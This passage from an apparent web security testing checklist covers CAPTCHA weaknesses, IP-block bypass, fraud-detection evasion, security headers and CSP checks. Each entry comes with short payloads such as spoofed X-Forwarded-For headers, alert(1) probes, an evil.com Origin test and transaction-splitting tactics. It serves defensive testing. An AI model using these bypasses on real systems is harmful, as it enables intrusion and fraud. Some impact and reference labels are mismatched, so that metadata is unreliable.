**Where to Test / Injection Point:** Captcha / reCAPTCHA

**Test Steps:** 1. Search client-side code for CAPTCHA secret keys. 2. Check for reCAPTCHA secret key exposure. 3. Verify that only the site key is in client-side code. 4. Check configuration files and source repositories.

**Expected Result:** Application must keep CAPTCHA secret keys server-side only and never expose them in client-accessible code.

**Payload Example:**

```
Search source for secret_key=;recaptcha_secret;RECAPTCHA_SECRET_KEY;hcaptcha_secret in JS files and page source
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Browser DevTools;GitLeaks;TruffleHog

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SEC-066 — CAPTCHA OCR Bypass Testing
**Test Category:** Authentication (WSTG-ATHN-08) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Captcha / reCAPTCHA

**Test Steps:** 1. If using custom image CAPTCHA test with OCR tools. 2. Check CAPTCHA complexity and distortion level. 3. Test with automated CAPTCHA solving services. 4. Measure solve rate.

**Expected Result:** Application must use CAPTCHA implementations that are resistant to automated solving including adequate distortion and noise for image-based solutions.

**Payload Example:**

```
Use Tesseract OCR on CAPTCHA images;test with anti-captcha.com API;test with 2captcha.com service
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Tesseract OCR;Anti-CAPTCHA;2Captcha;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SEC-067 — CAPTCHA Rate of Presentation
**Test Category:** Authentication (WSTG-ATHN-08) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Captcha / reCAPTCHA

**Test Steps:** 1. Check when CAPTCHA is presented. 2. Verify if CAPTCHA appears after a reasonable number of failed attempts. 3. Test if CAPTCHA is required on first attempt for critical operations. 4. Check for adaptive CAPTCHA.

**Expected Result:** Application must present CAPTCHA appropriately based on risk assessment and require it from the first attempt on critical operations.

**Payload Example:**

```
Submit 3-5 failed login attempts and check CAPTCHA trigger;verify CAPTCHA on registration;check adaptive behavior
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite;Manual Testing

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SEC-068 — CAPTCHA Accessibility Bypass
**Test Category:** Authentication (WSTG-ATHN-08) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Captcha / reCAPTCHA

**Test Steps:** 1. Check for audio CAPTCHA alternative. 2. Test if audio CAPTCHA can be solved by speech-to-text. 3. Check for CAPTCHA bypass via accessibility features. 4. Test fallback mechanisms.

**Expected Result:** Application must provide accessible CAPTCHA alternatives that maintain security while meeting accessibility requirements.

**Payload Example:**

```
Use Google Speech-to-Text API on audio CAPTCHA;test accessibility fallback endpoints;check for bypass via assistive modes
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Speech-to-Text APIs;Manual Testing

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SEC-069 — IP Block Bypass via Proxy Headers
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** IP Blocking

**Test Steps:** 1. Get blocked by IP. 2. Add X-Forwarded-For header with different IP. 3. Test X-Real-IP and X-Originating-IP and X-Client-IP headers. 4. Test with True-Client-IP header. 5. Check if any header bypasses the block.

**Expected Result:** Application must determine client IP from the actual network connection not from client-provided HTTP headers for IP blocking decisions.

**Payload Example:**

```
X-Forwarded-For: 8.8.8.8;X-Real-IP: 1.1.1.1;X-Originating-IP: 127.0.0.1;X-Client-IP: 10.0.0.1;True-Client-IP: random
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;cURL

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SEC-070 — IP Block Bypass via IPv6
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** IP Blocking

**Test Steps:** 1. If blocked on IPv4 try accessing via IPv6. 2. Test with IPv6 representations of the same address. 3. Check if IPv4-mapped IPv6 addresses bypass blocks. 4. Test with IPv6 localhost.

**Expected Result:** Application must enforce IP blocking consistently across IPv4 and IPv6 addresses and handle IPv4-mapped IPv6 addresses properly.

**Payload Example:**

```
Access via IPv6 address;use ::ffff:BLOCKED_IP (IPv4-mapped);use ::1 for localhost;use IPv6 shorthand variations
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** cURL;Browser;nmap

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SEC-071 — IP Block Evasion via Request Routing
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** IP Blocking

**Test Steps:** 1. If blocked try accessing through different application entry points. 2. Test via alternative ports. 3. Test via different subdomains. 4. Check if CDN IPs are used for block bypass. 5. Test via VPN or proxy.

**Expected Result:** Application must enforce IP blocking at all entry points consistently and not allow bypass through alternative routing.

**Payload Example:**

```
Access blocked resource via api.target.com vs www.target.com;use port 8080 vs 443;route through CDN
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** cURL;VPN;Proxy Services

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SEC-072 — IP Whitelist Bypass Testing
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** IP Blocking

**Test Steps:** 1. Identify IP-whitelisted resources. 2. Test for IP spoofing via headers. 3. Check for SSRF to access from server IP. 4. Test if localhost access bypasses whitelist. 5. Check for DNS rebinding bypass.

**Expected Result:** Application must validate IP whitelists using actual connection source and not be bypassable through header manipulation or SSRF.

**Payload Example:**

```
Use SSRF to access whitelist-protected resources from server IP;spoof whitelisted IP via X-Forwarded-For
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;SSRFMap;Custom Scripts

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SEC-073 — IP Block Persistence and Timeout
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** IP Blocking

**Test Steps:** 1. Trigger IP blocking. 2. Wait and test at various intervals. 3. Check if the block is permanent or temporary. 4. Verify the block timeout period. 5. Test if blocks reset properly.

**Expected Result:** Application must implement appropriate block durations with automatic unblocking and provide clear communication about block status.

**Payload Example:**

```
Trigger IP block then test at 5m;15m;30m;1h;24h intervals to determine block duration and reset behavior
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## SEC-074 — IP Blocking Denial of Service
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** IP Blocking

**Test Steps:** 1. Check if an attacker can cause legitimate users to be blocked. 2. Spoof the victim's IP in headers if trusted. 3. Send malicious traffic from shared IP like corporate NAT. 4. Test for collateral blocking.

**Expected Result:** Application must implement IP blocking with safeguards against legitimate user blocking and use behavioral analysis beyond simple IP.

**Payload Example:**

```
Spoof X-Forwarded-For with victim IP if server trusts header;send attack traffic from shared NAT IP
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## SEC-075 — Geographic IP Blocking Bypass
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** IP Blocking

**Test Steps:** 1. If geo-blocking is implemented test bypass via VPN. 2. Test with TOR exit nodes. 3. Check for geo-IP database accuracy. 4. Test with IP addresses near geo boundaries.

**Expected Result:** Application must implement robust geo-blocking that considers VPN and proxy evasion and regularly update geo-IP databases.

**Payload Example:**

```
Access geo-blocked content via VPN in allowed region;use TOR;use cloud servers in allowed regions
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** VPN;TOR;Cloud Infrastructure

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SEC-076 — Fraud Detection Bypass via Behavioral Mimicry
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Fraud Detection

**Test Steps:** 1. Study normal user behavior patterns. 2. Replicate normal timing and navigation patterns in automated attacks. 3. Add realistic delays between actions. 4. Mimic human-like mouse movements and interactions.

**Expected Result:** Application must implement multi-layered fraud detection that goes beyond simple behavioral patterns including device fingerprinting and transaction analysis.

**Payload Example:**

```
Add random delays 1-5 seconds between requests;mimic normal click patterns;use realistic User-Agent strings;vary request timing
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Selenium;Puppeteer;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## SEC-077 — Fraud Detection Response Analysis
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Fraud Detection

**Test Steps:** 1. Trigger fraud detection on purpose. 2. Analyze the response for clues about detection criteria. 3. Compare responses for flagged vs clean requests. 4. Check for information leakage about fraud rules.

**Expected Result:** Application must not reveal fraud detection criteria or rules through response differences and must handle flagged transactions uniformly.

**Payload Example:**

```
Compare responses for normal vs suspicious transactions;check for fraud_score;risk_level;detection_reason in responses
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SEC-078 — Fraud Detection Timing Attack
**Test Category:** Information Disclosure (WSTG-INFO-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Fraud Detection

**Test Steps:** 1. Submit transactions designed to trigger fraud checks. 2. Measure response times for flagged vs clean transactions. 3. Use timing differences to determine fraud thresholds. 4. Map fraud detection rules through timing analysis.

**Expected Result:** Application must ensure consistent response times regardless of fraud detection outcomes to prevent timing-based rule discovery.

**Payload Example:**

```
Compare timing for transaction_amount=49.99 vs 50.01 (potential threshold);measure response times across multiple variables
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SEC-079 — Account Takeover Detection Bypass
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Fraud Detection

**Test Steps:** 1. Login from a new device or location. 2. Check if anomaly detection triggers. 3. Gradually change device fingerprint components. 4. Test with slow IP address changes. 5. Bypass device fingerprinting.

**Expected Result:** Application must implement robust account takeover detection that cannot be gradually evaded through incremental changes.

**Payload Example:**

```
Slowly change User-Agent components over time;change IP address gradually;modify device fingerprint incrementally
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## SEC-080 — Payment Fraud Detection Evasion
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Fraud Detection

**Test Steps:** 1. Test with amounts just below fraud thresholds. 2. Split large transactions into smaller ones. 3. Use different payment methods for split transactions. 4. Test velocity-based detection limits.

**Expected Result:** Application must detect fraud patterns including transaction splitting and velocity abuse across payment methods and accounts.

**Payload Example:**

```
Split $10000 transaction into 10x$999;alternate payment methods;space transactions over time;test threshold boundaries
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## SEC-081 — Multi-Account Fraud Detection Bypass
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Fraud Detection

**Test Steps:** 1. Create multiple accounts with slight variations. 2. Use different email addresses with same patterns. 3. Share payment methods across accounts. 4. Test device fingerprint uniqueness detection.

**Expected Result:** Application must detect multi-account fraud through cross-account analysis of device fingerprints and payment methods and behavioral patterns.

**Payload Example:**

```
Create accounts with test1@email.com;test2@email.com from same device;share payment method across accounts
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Custom Scripts;Selenium

**References:** CWE-840; PortSwigger Business logic

---

## SEC-082 — Fraud Rule Enumeration
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Fraud Detection

**Test Steps:** 1. Systematically test different transaction parameters. 2. Vary amounts and frequencies and locations. 3. Map which parameter combinations trigger fraud. 4. Document fraud detection thresholds.

**Expected Result:** Application must implement non-deterministic fraud detection that cannot be fully mapped through systematic testing.

**Payload Example:**

```
Test amounts from $1 to $10000 in increments;vary IP locations;change transaction frequency;map fraud trigger points
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## SEC-083 — X-Frame-Options Header Verification
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Security Headers

**Test Steps:** 1. Check for X-Frame-Options header on all responses. 2. Verify value is DENY or SAMEORIGIN. 3. Test if the page can be framed from external origin. 4. Check for CSP frame-ancestors directive as alternative.

**Expected Result:** Application must set X-Frame-Options: DENY or SAMEORIGIN on all responses to prevent clickjacking or use CSP frame-ancestors.

**Payload Example:**

```
Check response for X-Frame-Options header;test with <iframe src='https://target.com'> from different origin
```

**Impact:** Clickjacking of a sensitive action -&gt; UI-redress-driven state change.

**Tools:** Burp Suite;SecurityHeaders.com;Browser

**References:** CWE-1021; -&gt;[CSRF checklist](#/checklist/csrf); OWASP Clickjacking; PortSwigger

---

## SEC-084 — X-Content-Type-Options Header Check
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Security Headers

**Test Steps:** 1. Check for X-Content-Type-Options: nosniff header. 2. Verify it is present on all responses. 3. Test MIME type sniffing by serving JS with text/plain content type. 4. Check for content type confusion vulnerabilities.

**Expected Result:** Application must set X-Content-Type-Options: nosniff on all responses to prevent MIME type sniffing attacks.

**Payload Example:**

```
Check for missing X-Content-Type-Options;serve <script>alert(1)</script> with Content-Type: text/plain and check browser behavior
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;SecurityHeaders.com

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-085 — X-XSS-Protection Header Verification
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** Low · **CVSS:** 3.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Security Headers

**Test Steps:** 1. Check for X-XSS-Protection header. 2. Verify value is 1; mode=block or 0 (disabled as CSP is preferred). 3. Check if XSS auditor can be abused for information leakage. 4. Verify CSP is used instead.

**Expected Result:** Application should use Content-Security-Policy instead of X-XSS-Protection as the XSS auditor can be abused for side-channel attacks in some browsers.

**Payload Example:**

```
Check for X-XSS-Protection: 1; mode=block or X-XSS-Protection: 0 with proper CSP implementation
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;SecurityHeaders.com

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SEC-086 — Referrer-Policy Header Check
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Security Headers

**Test Steps:** 1. Check for Referrer-Policy header on all responses. 2. Verify policy restricts referrer information to third parties. 3. Test with links to external sites. 4. Verify sensitive URLs are not leaked via Referer header.

**Expected Result:** Application must set Referrer-Policy to strict-origin-when-cross-origin or no-referrer to prevent leaking sensitive URL information.

**Payload Example:**

```
Check for Referrer-Policy header;click external links and verify Referer header content;check for token leakage in referrer
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-087 — Permissions-Policy Header Verification
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Security Headers

**Test Steps:** 1. Check for Permissions-Policy (formerly Feature-Policy) header. 2. Verify geolocation and camera and microphone and payment permissions are restricted. 3. Test if restricted features are accessible from iframes.

**Expected Result:** Application must set Permissions-Policy header to restrict unnecessary browser features and prevent feature abuse in embedded contexts.

**Payload Example:**

```
Check for Permissions-Policy: geolocation=(); camera=(); microphone=(); payment=() in response headers
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;SecurityHeaders.com

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-088 — Cache-Control Headers for Sensitive Pages
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Security Headers

**Test Steps:** 1. Access sensitive pages like account settings and payment details and personal information. 2. Check Cache-Control headers. 3. Verify no-store and no-cache directives on sensitive responses. 4. Check Pragma header.

**Expected Result:** Sensitive pages must include Cache-Control: no-store; no-cache; must-revalidate and Pragma: no-cache to prevent caching of sensitive data.

**Payload Example:**

```
Check sensitive page responses for Cache-Control: no-store;Pragma: no-cache;Expires: 0;verify back button doesn't show cached data
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-089 — Cross-Origin Headers Assessment
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Security Headers

**Test Steps:** 1. Check CORS headers Access-Control-Allow-Origin. 2. Test with arbitrary Origin header. 3. Check for wildcard (*) origin allowance. 4. Check Access-Control-Allow-Credentials with wildcard. 5. Test for null origin acceptance.

**Expected Result:** Application must implement strict CORS policies with specific allowed origins and never use wildcard with credentials or accept null origin.

**Payload Example:**

```
Send Origin: https://evil.com and check if reflected;test Origin: null;check for Access-Control-Allow-Origin: *;verify credentials flag
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;cURL;Postman

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-090 — Missing Security Headers Comprehensive Check
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Security Headers

**Test Steps:** 1. Scan all response headers for comprehensive security header presence. 2. Check for all recommended security headers. 3. Identify missing headers. 4. Verify header values are correctly configured.

**Expected Result:** Application must implement all recommended security headers with proper values including HSTS and CSP and X-Frame-Options and X-Content-Type-Options.

**Payload Example:**

```
Check for all headers: HSTS;CSP;X-Frame-Options;X-Content-Type-Options;Referrer-Policy;Permissions-Policy;CORP;COEP;COOP
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** SecurityHeaders.com;Burp Suite;Mozilla Observatory

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-091 — Cross-Origin-Resource-Policy (CORP) Check
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Security Headers

**Test Steps:** 1. Check for Cross-Origin-Resource-Policy header on sensitive resources. 2. Verify value is same-origin or same-site as appropriate. 3. Test if sensitive resources can be loaded cross-origin.

**Expected Result:** Application must set Cross-Origin-Resource-Policy: same-origin on sensitive resources to prevent cross-origin information leakage.

**Payload Example:**

```
Check API responses and sensitive resources for Cross-Origin-Resource-Policy header;attempt cross-origin resource loading
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-092 — Server Header Information Disclosure
**Test Category:** Information Disclosure (WSTG-INFO-02) · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Security Headers

**Test Steps:** 1. Check Server response header for version information. 2. Check X-Powered-By header. 3. Check X-AspNet-Version and X-AspNetMvc-Version. 4. Verify no technology stack information is disclosed.

**Expected Result:** Application must remove or obscure server technology information from response headers to prevent targeted attacks.

**Payload Example:**

```
Check for Server: Apache/2.4.49;X-Powered-By: Express;X-AspNet-Version: 4.0;X-Generator: WordPress
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;cURL;Nmap

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SEC-093 — CSP Presence and Basic Validation
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Security Policy

**Test Steps:** 1. Check for Content-Security-Policy header on all responses. 2. Verify CSP is not in report-only mode for production. 3. Parse and analyze all CSP directives. 4. Check for overly permissive policies.

**Expected Result:** Application must implement a strict Content-Security-Policy header that restricts script sources and prevents inline script execution.

**Payload Example:**

```
Check for Content-Security-Policy header;verify not Content-Security-Policy-Report-Only;analyze directive strictness
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;CSP Evaluator;SecurityHeaders.com

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-094 — CSP unsafe-inline Detection
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Security Policy

**Test Steps:** 1. Check if CSP allows unsafe-inline for script-src. 2. Check if unsafe-inline is present in style-src. 3. Test if inline scripts execute despite CSP. 4. Check for nonce or hash-based inline allowance.

**Expected Result:** CSP must not use unsafe-inline for script-src and should use nonce or hash-based approaches for necessary inline scripts.

**Payload Example:**

```
Check CSP for script-src 'unsafe-inline';inject <script>alert(1)</script> to verify inline scripts are blocked
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;CSP Evaluator;Browser DevTools

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-095 — CSP unsafe-eval Detection
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Security Policy

**Test Steps:** 1. Check if CSP allows unsafe-eval for script-src. 2. Test if eval() and setTimeout(string) and new Function() work. 3. Verify if unsafe-eval can be removed without breaking functionality.

**Expected Result:** CSP must not use unsafe-eval for script-src to prevent dynamic code execution attacks.

**Payload Example:**

```
Check CSP for script-src 'unsafe-eval';test eval('alert(1)');setTimeout('alert(1)',0);new Function('alert(1)')()
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;CSP Evaluator;Browser DevTools

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-096 — CSP Wildcard and Overly Permissive Sources
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Security Policy

**Test Steps:** 1. Check CSP for wildcard (*) in script-src. 2. Check for overly broad domain whitelisting. 3. Check for data: URI allowance in script-src. 4. Check for blob: URI allowance. 5. Identify CDN domains that allow user-uploaded scripts.

**Expected Result:** CSP must not use wildcard or overly broad domain patterns in script-src and must not allow data: or blob: URIs for scripts.

**Payload Example:**

```
Check for script-src *;script-src *.cloudfront.net;script-src data:;script-src blob:;check for exploitable CDN domains
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;CSP Evaluator

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-097 — CSP Bypass via Allowed Domain Exploitation
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Security Policy

**Test Steps:** 1. Identify all domains whitelisted in CSP script-src. 2. Check each domain for exploitable endpoints like JSONP or Angular template injection. 3. Look for open redirects on whitelisted domains. 4. Test for CSP bypass through whitelisted CDNs.

**Expected Result:** CSP whitelisted domains must not contain exploitable endpoints that could be abused to execute arbitrary JavaScript.

**Payload Example:**

```
Check whitelisted CDN for JSONP: https://whitelisted.cdn.com/jsonp?callback=alert(1)//;find Angular/React template injection on whitelisted domain
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;CSP Evaluator;Custom Scripts

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-098 — CSP Nonce Predictability and Reuse
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Security Policy

**Test Steps:** 1. If CSP uses nonces collect multiple page loads and extract nonces. 2. Analyze nonce entropy and randomness. 3. Check if nonces are reused across requests. 4. Verify nonce length is adequate.

**Expected Result:** CSP nonces must be cryptographically random with at least 128 bits of entropy and unique per response.

**Payload Example:**

```
Collect 100+ nonces from page loads;analyze with Burp Sequencer;check for reuse;verify minimum 16 bytes base64
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite Sequencer;Custom Scripts

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-099 — CSP Reporting Endpoint Security
